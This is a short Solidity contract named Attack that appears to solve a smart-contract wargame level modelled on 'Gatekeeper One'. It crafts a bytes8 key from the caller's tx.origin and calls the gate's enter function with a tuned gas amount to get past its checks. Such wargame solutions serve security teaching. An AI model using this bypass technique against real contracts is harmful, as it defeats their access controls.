//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8) external;    
}

contract Attack {
    constructor(IGatekeeperOne gate) payable {
        // 0x000000010000xxxx - xxxx are last 2 bytes of tx.origin 
        bytes8 gateKey = bytes5(uint40(0x0100)) | bytes8(uint64(uint16(uint160(tx.origin))));
        gate.enter{gas: 24829}(gateKey);
    }
}